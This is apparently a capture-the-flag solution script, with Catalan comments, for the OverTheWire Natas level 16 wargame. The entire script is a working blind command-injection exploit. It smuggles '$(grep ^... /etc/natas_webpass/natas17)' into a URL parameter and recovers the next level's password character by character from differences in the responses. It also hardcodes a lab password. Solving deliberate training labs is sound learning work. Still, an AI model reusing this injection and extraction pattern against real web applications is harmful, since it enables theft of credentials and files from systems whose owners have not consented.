import requests, string

url = "http://natas16.natas.labs.overthewire.org/"
username = "natas16"
# Password del nivell on estic
password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
# Les contrasenyes del natas no tenen símbols per tant ens els estalviarem
# Posem tots els caràcters i lletres de l'abecedari (tant majúscules com minúscules)
# Comprova només els caràcters trets amb l'script anterior
characters = ['0', '1', '7', '9', 'b', 'd', 'h', 'k', 'm', 'n', 's', 'u', 'v', 'B', 'C', 'E', 'H', 'I', 'K', 'L', 'R', 'S', 'U', 'X']

# Ara fem un for i anem guardant els caràcters que anem trobant per utilitzar-los després al segon script
#Passchar = []
# El que ens retorna l'aplicació web quan troba un usuari que existeix
userExist = 'Africans'
#Fem una variable per guardar la contrasenya
secret = ''

# Sabem que les passwords tenen màxim 32 caràcters
for place in range (1,32):
    for char in characters:
        # Necessitem anar guardant els caràcters, anirà sumant el caràcter
        temp = ''.join([secret,char])
        # Canviem la i d'abans per la nova variable temp que hem creat
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=Africans$(grep ^' + temp + ' /etc/natas_webpass/natas17)', auth=(username, password))
        # Si l'usuari no existeix, afegim el caràcter a la contrasenya i l'imprimim
        if not userExist in r.text:
            secret += char
            print(char)
# Imprimim la contrasenya final
print(secret)